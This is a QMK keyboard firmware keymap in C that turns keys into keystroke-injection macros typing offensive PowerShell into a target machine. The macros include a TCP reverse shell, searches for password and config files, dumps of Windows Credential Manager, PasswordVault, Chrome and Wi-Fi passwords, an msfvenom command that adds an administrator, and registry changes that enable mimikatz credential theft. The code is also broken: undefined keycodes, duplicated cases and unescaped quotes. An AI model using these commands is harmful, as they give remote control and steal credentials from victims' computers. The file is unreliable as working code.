/* Copyright 2020 Hugh Mungis
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
#include QMK_KEYBOARD_H
#include "ake160886.h"
//YOUR MACROS MUST BE ENUMERATED HERE BEFORE YOU CAN USE THEM
enum custom_keycodes {
    PSPT = SAFE_RANGE,
    QMKURL,
    MY_OTHER_MACRO,
    PS01,
    PS02,
    PS03,
    PS04,
    PS05,
};

// in keyboard.c
// You could technically add more layers if 160 keys are not enough
// This is me trying to make a normal-ish layout in the middle of the keyboard, leaving the rest unassigned
// Going to need a wiiiide editor window for this to look readable
// Available keycodes are at https://github.com/qmk/qmk_firmware/blob/master/docs/keycodes.md
const uint16_t PROGMEM keymaps[] [MATRIX_ROWS][MATRIX_COLS] = {
  [0] = LAYOUT( \
    KC_MPLY,          KC_MPRV, KC_MNXT,  KC_F1,   KC_F2,   KC_F3,   KC_F4,   KC_F5,   KC_F6,   KC_F7,   KC_F8,   KC_F9,   KC_F10,  KC_F11,  KC_F12,  KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,
    KC_MUTE, KC_NO,     KC_NO,   KC_NO,   KC_1,    KC_2,    KC_3,    KC_4,    KC_5,    KC_6,    KC_7,    KC_8,    KC_9,     KC_0, KC_MINS,  KC_EQL,  KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,

    KC_ESC,  KC_NO,   KC_NO,   KC_NO,    KC_GRV,  KC_NO,         KC_NO,         KC_NO,       KC_NO,       KC_NO,          KC_NO,      KC_NO,      KC_NO,      KC_NO,    KC_NO,            KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,
    KC_NO,   KC_NO,   KC_NO,   KC_NO,    KC_TAB,  KC_Q,    KC_W,    KC_E,    KC_R,    KC_T,    KC_Y,    KC_U,    KC_I,    KC_O,    KC_P,    KC_LBRC, KC_RBRC, KC_BSLS,  KC_NO,   KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,
    KC_NO,   KC_NO,   KC_NO,   KC_NO,    KC_CAPS, KC_A,    KC_S,    KC_D,    KC_F,    KC_G,    KC_H,    KC_J,    KC_K,    KC_L,    KC_SCLN, KC_QUOT, KC_NO,    KC_ENT,  KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,   KC_NO,
    KC_NO,   KC_NO,   KC_NO,   KC_NO,    KC_NO,   KC_LSFT, KC_NO,   KC_Z,    KC_X,    KC_C,    KC_V,    KC_B,    KC_N,    KC_M,    KC_COMM, KC_DOT,  KC_SLSH, KC_NO,    KC_RSFT, KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,
    BIBL,             KC_NO,   KC_NO,    KC_NO,   KC_LCTL, KC_LWIN,             KC_LALT,             KC_SPC,        KC_RALT, KC_NO,   KC_APP,                           KC_RCTL,          KC_NO,    KC_NO,   KC_NO,   KC_NO       )};

// Optional override functions below.
// You can leave any or all of these undefined.
// These are only required if you want to perform custom actions.

/*
void matrix_init_kb(void) {
    // put your keyboard start-up code here
    // runs once when the firmware starts up

    matrix_init_user();
}

void matrix_scan_kb(void) {
    // put your looping keyboard code here
    // runs every cycle (a lot)

    matrix_scan_user();
}

bool process_record_kb(uint16_t keycode, keyrecord_t *record) {
    // put your per-action keyboard code here
    // runs for every action, just before processing by the firmware

    return process_record_user(keycode, record);
}

bool led_update_kb(led_t led_state) {
    // put your keyboard LED indicator (ex: Caps Lock LED) toggling code here

    return led_update_user(led_state);
}
*/


bool process_record_user(uint16_t keycode, keyrecord_t *record) {
    switch (keycode) {
    case PSPT:
        if (record->event.pressed) {
            // When keycode PSPT is pressed. Powersploit is sent as a Base64 encoded string to the target computer.
            SS_LCTRL("r")SEND_STRING("powershell.exe")SEND_STRING("");
        } else {
            // when keycode QMKBEST is released
        }
        break;

    case QMKURL:
        if (record->event.pressed) {
            // when keycode QMKURL is pressed
            SEND_STRING("https://qmk.fm/\n");
        } else {
            // when keycode QMKURL is released
        }
        break;

    case MY_OTHER_MACRO:
        if (record->event.pressed) {
           SEND_STRING(SS_LCTL("ac")); // selects all and copies
        }
        break;

    case PS01: // this checks the powershell version
        if (record->event.pressed) {
           SEND_STRING("$PSVersionTable"); 
        }
        break;

    case PS02: // current domain info
        if (record->event.pressed) {
           SEND_STRING("[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"); 
        }
        break;

    case PS03:// this gets the DCs on a domain
        if (record->event.pressed) {
           SEND_STRING("net group \"domain controllers\" /domain"); // current domain info
        }
        break;

    case PS04:// simple powershell reverse shell
        if (record->event.pressed) {
           SEND_STRING("$sm=(New-Object Net.Sockets.TCPClient('$RHOST',$RPORT)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"); // current domain info
        }
        break;

    case PS05: // this checks the powershell version
        if (record->event.pressed) {
           SEND_STRING("$PSVersionTable"); 
        }
        break;
    
    case PS06: // NOISY. With this command we can identify files with potentially sensitive data such as account information, credentials, configuration files etc based on their filename.
        if (record->event.pressed) {
           SEND_STRING("gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue"); 
        }
        break;

    case PS07: // Find credentials in Sysprep or Unattend files
        if (record->event.pressed) {
           SEND_STRING("gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue");
        }
        break;

    case PS08: // Find configuration files containing “password” string
        if (record->event.pressed) {
           SEND_STRING("gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"); 
        }
        break;
            
    case PS09: // Find database credentials in configuration files
        if (record->event.pressed) {
           SEND_STRING("gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"); 
        }
        break;
            
    case PS10: // Locate web server configuration files
        if (record->event.pressed) {
           SEND_STRING("gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue"); 
        }
        break;
            
    case PS11: // Get stored passwords from Windows PasswordVault
        if (record->event.pressed) {
           SEND_STRING("[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }"); 
        }
        break;
            
    case PS12: // Get stored passwords from Windows Credential Manager
        if (record->event.pressed) {
           SEND_STRING("Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"); 
        }
        break;
            
    case PS13: // Dump passwords from Google Chrome browser
        if (record->event.pressed) {
           SEND_STRING("[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))"); 
        }
        break;
                       
    case PS14: // Get stored Wi-Fi passwords from Wireless Profiles
        if (record->event.pressed) {
           SEND_STRING("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\W+\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize"); 
        }
        break;
                       
    case PS15: // Search for SNMP community string in registry
        if (record->event.pressed) {
           SEND_STRING("gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue"); 
        }
        break;
                       
    case PS16: // Search registry for auto-logon credentials
        if (record->event.pressed) {
           SEND_STRING("gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select \"Default*\""); 
        }
        break;
                       
    case PS17: // Check if AlwaysInstallElevated is enabled. if it works, generate the malicious .msi in msfvenom with the following command: msfvenom -p windows/exec CMD='net localgroup administrators joe /add' -f msi > pkg.msi
        if (record->event.pressed) {
           SEND_STRING("gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated; gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated"); 
        }
        break;
                       
    case PS18: // Find unquoted service paths
        if (record->event.pressed) {
           SEND_STRING("gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\Windows*\" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name"); 
        }
        break;
                       
    case PS19: // Check for LSASS WDigest caching. If value is 0, mimikatz won't work and you'll have to use the next command. Otherwise enjoy!
        if (record->event.pressed) {
           SEND_STRING("gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential"); 
        }
        break;
                       
    case PS20: // Enable LSASS caching in order for mimikatz to work on the target machine
        if (record->event.pressed) {
           SEND_STRING("sp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest -name UseLogonCredential -value 1"); 
        }
        break;
                       
    case PS01: // this checks the powershell version
        if (record->event.pressed) {
           SEND_STRING("$PSVersionTable"); 
        }
        break;
                       
    case PS01: // this checks the powershell version
        if (record->event.pressed) {
           SEND_STRING("$PSVersionTable"); 
        }
        break;
                       
    case PS01: // this checks the powershell version
        if (record->event.pressed) {
           SEND_STRING("$PSVersionTable"); 
        }
        break;
                       
    case PS01: // this checks the powershell version
        if (record->event.pressed) {
           SEND_STRING("$PSVersionTable"); 
        }
        break;
                       
    case PS01: // this checks the powershell version
        if (record->event.pressed) {
           SEND_STRING("$PSVersionTable"); 
        }
        break;
                       
    case PS01: // this checks the powershell version
        if (record->event.pressed) {
           SEND_STRING("$PSVersionTable"); 
        }
        break;
                       
    case PS01: // this checks the powershell version
        if (record->event.pressed) {
           SEND_STRING("$PSVersionTable"); 
        }
        break;
                       
    }
    return true;
};
